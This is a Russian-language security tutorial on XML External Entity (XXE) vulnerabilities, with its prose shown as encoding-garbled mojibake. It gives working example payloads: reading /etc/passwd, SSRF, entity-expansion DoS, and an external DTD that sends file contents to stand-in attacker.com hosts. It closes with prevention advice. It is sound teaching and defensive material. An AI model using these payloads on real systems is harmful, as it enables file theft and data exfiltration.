# üõ†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å XML External Entity (XXE)

## üìú –û–±–∑–æ—Ä

**XML External Entity (XXE)** ‚Äî —ç—Ç–æ —Ç–∏–ø –∞—Ç–∞–∫–∏, –Ω–∞—Ü–µ–ª–µ–Ω–Ω—ã–π –Ω–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—â–∏–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ XML. –ï—Å–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏–ª–∏ –¥–æ–ø—É—Å–∫–∞–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤–Ω–µ—à–Ω–∏—Ö —Å—É—â–Ω–æ—Å—Ç–µ–π, –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ –¥–ª—è:

- –î–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.
- –í—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ –∫–æ–¥–∞.
- –ü—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∞—Ç–∞–∫ —Ç–∏–ø–∞ "–æ—Ç–∫–∞–∑ –≤ –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–∏" (DoS).
- –ù–∞—Ä—É—à–µ–Ω–∏—è —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏ –∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã.

---

## üîç –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç

1. **–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–π —Å—É—â–Ω–æ—Å—Ç–∏ XML**
   XML –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–Ω–µ—à–Ω–∏–µ —Å—É—â–Ω–æ—Å—Ç–∏ ‚Äî —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Ç–µ–≥–∏ –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –≤–Ω–µ—à–Ω–∏—Ö –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ —Ä–µ—Å—É—Ä—Å–æ–≤.

2. **–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞**
   –ï—Å–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç –∏–ª–∏ –Ω–µ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ XML, –≤–æ–∑–º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –≤–Ω–µ—à–Ω–∏—Ö —Å—É—â–Ω–æ—Å—Ç–µ–π.

3. **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è**
   –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å XXE –¥–ª—è –∫—Ä–∞–∂–∏ –¥–∞–Ω–Ω—ã—Ö, –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –ª–æ–∫–∞–ª—å–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏ –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É–¥–∞–ª—ë–Ω–Ω—ã—Ö HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤ —á–µ—Ä–µ–∑ –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Å—É—â–Ω–æ—Å—Ç–µ–π.

---

## ‚öôÔ∏è –í–∏–¥—ã –∞—Ç–∞–∫ XXE

1. **–†–∞—Å–∫—Ä—ã—Ç–∏–µ —Ñ–∞–π–ª–æ–≤**
   –î–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–º —Ñ–∞–π–ª–∞–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, —Ç–∞–∫–∏–º –∫–∞–∫ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã –∏–ª–∏ –∑–∞–∫—Ä—ã—Ç—ã–µ –∫–ª—é—á–∏.

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

2. **Server-Side Request Forgery (SSRF)**
   –ü—Ä–∏–Ω—É–∂–¥–µ–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞ –≤—ã–ø–æ–ª–Ω—è—Ç—å HTTP-–∑–∞–ø—Ä–æ—Å—ã –Ω–∞ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞.

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "http://malicious-site.com/malware">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

3. **–û—Ç–∫–∞–∑ –≤ –æ–±—Å–ª—É–∂–∏–≤–∞–Ω–∏–∏ (DoS)**
   –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–æ–ª—å—à–∏—Ö –∏–ª–∏ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω—ã—Ö –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫ –¥–ª—è –ø–µ—Ä–µ–≥—Ä—É–∑–∫–∏ –ø–∞—Ä—Å–µ—Ä–∞ –∏ –≤—ã–≤–æ–¥–∞ —Å–µ—Ä–≤–µ—Ä–∞ –∏–∑ —Å—Ç—Ä–æ—è.

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY a "b">
     <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
   ]>
   <root>
     <data>&b;</data>
   </root>
   ```

4. **–£–¥–∞–ª—ë–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ (RCE)**
   –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ (–µ—Å–ª–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è XML-–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–º).

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY % init SYSTEM "http://malicious-site.com/malicious.dtd">
     %init;
   ]>
   <root/>
   ```

   **–í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π DTD (malicious.dtd):**
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfil;
   ```

5. **–°–ª–µ–ø–∞—è XXE (Blind XXE)**
   –°—Ü–µ–Ω–∞—Ä–∏–∏, –∫–æ–≥–¥–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –Ω–µ –º–æ–∂–µ—Ç –Ω–∞–ø—Ä—è–º—É—é —É–≤–∏–¥–µ—Ç—å –æ—Ç–≤–µ—Ç, –Ω–æ –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–Ω–µ—à–Ω–∏–µ –∑–∞–ø—Ä–æ—Å—ã –¥–ª—è –Ω–∞–±–ª—é–¥–µ–Ω–∏—è –∑–∞ –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º.

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "http://attacker.com/log?data=exfiltrated">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

6. **Out-of-Band (OOB) XXE**
   –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤, –≤ –∫–æ—Ç–æ—Ä—ã—Ö –¥–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è —á–µ—Ä–µ–∑ DNS –∏–ª–∏ –¥—Ä—É–≥–∏–µ –ø—Ä–æ—Ç–æ–∫–æ–ª—ã, –∞ –Ω–µ –≤ HTTP-–æ—Ç–≤–µ—Ç–µ.

   **–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
   ```xml
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "http://attacker-dns.com/?query=leak">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```

---

## ‚ö†Ô∏è –ü—Ä–∏–º–µ—Ä —Å—Ü–µ–Ω–∞—Ä–∏—è

–ù–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è —Å–æ–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ–∫—É–ø–æ–∫ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —É—Ä–æ–≤–µ–Ω—å –∑–∞–ø–∞—Å–æ–≤ —Ç–æ–≤–∞—Ä–∞, –æ—Ç–ø—Ä–∞–≤–ª—è—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å–ª–µ–¥—É—é—â–∏–π XML-–∫–æ–¥:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –ø—Ä–∏–Ω–∏–º–∞—é—â–µ–µ XML –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:

- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç XML —Å –≤–Ω–µ—à–Ω–µ–π —Å—É—â–Ω–æ—Å—Ç—å—é.
- –°–µ—Ä–≤–µ—Ä –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Å—É—â–Ω–æ—Å—Ç—å –∏ –≤—ã–¥–∞—ë—Ç –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.

**–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<foo>&xxe;</foo>
```

–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∞–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ `/etc/hosts`.

---

## üõ°Ô∏è –°—Ç—Ä–∞—Ç–µ–≥–∏–∏ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è

1. **–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–Ω–µ—à–Ω–∏—Ö —Å—É—â–Ω–æ—Å—Ç–µ–π**
   –ù–∞—Å—Ç—Ä–æ–π—Ç–µ XML-–ø–∞—Ä—Å–µ—Ä –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–Ω–µ—à–Ω–∏—Ö —Å—É—â–Ω–æ—Å—Ç–µ–π. –ù–∞–ø—Ä–∏–º–µ—Ä, –≤ Java:
   ```java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   ```

2. **–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏**
   –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç XML –±–µ–∑–æ–ø–∞—Å–Ω–æ, –Ω–∞–ø—Ä–∏–º–µ—Ä, `defusedxml` –≤ Python.

3. **–í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö**
   –í–∞–ª–∏–¥–∏—Ä—É–π—Ç–µ –∏ —Ñ–∏–ª—å—Ç—Ä—É–π—Ç–µ –≤—Å–µ –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ XML –ø–µ—Ä–µ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π.

4. **–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞**
   –û–≥—Ä–∞–Ω–∏—á—å—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–º —Ñ–∞–π–ª–∞–º –∏ —Ä–µ—Å—É—Ä—Å–∞–º, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã.

5. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ**
   –û–±–Ω–∞—Ä—É–∂–∏–≤–∞–π—Ç–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å, –æ—Ç—Å–ª–µ–∂–∏–≤–∞—è –Ω–µ–æ–±—ã—á–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º –∏–ª–∏ —Å–µ—Ç–∏.

---

## üìö –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–£—è–∑–≤–∏–º–æ—Å—Ç–∏ XXE –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç —Å–µ—Ä—å—ë–∑–Ω—É—é —É–≥—Ä–æ–∑—É –¥–ª—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—â–∏—Ö XML. –ü–æ–Ω–∏–º–∞—è, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç —ç—Ç–∏ –∞—Ç–∞–∫–∏, –∏ –≤–Ω–µ–¥—Ä—è—è –Ω–∞–¥—ë–∂–Ω—ã–µ –º–µ—Ä—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –≤—ã –º–æ–∂–µ—Ç–µ –∑–∞—â–∏—Ç–∏—Ç—å —Å–≤–æ–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏ –∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.

–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—è–∑–≤–∏–º–æ—Å—Ç—è—Ö XXE –ø–æ—Å–µ—Ç–∏—Ç–µ [OWASP XXE Prevention Cheatsheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

---

> **–ü–æ–º–Ω–∏—Ç–µ:** –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å ‚Äî —ç—Ç–æ –ø–æ—Å—Ç–æ—è–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å. –ë—É–¥—å—Ç–µ –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω—ã –∏ –æ–±–Ω–æ–≤–ª—è–π—Ç–µ —Å–≤–æ–∏ –ø—Ä–∞–∫—Ç–∏–∫–∏ –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç –Ω–æ–≤—ã—Ö —É–≥—Ä–æ–∑!
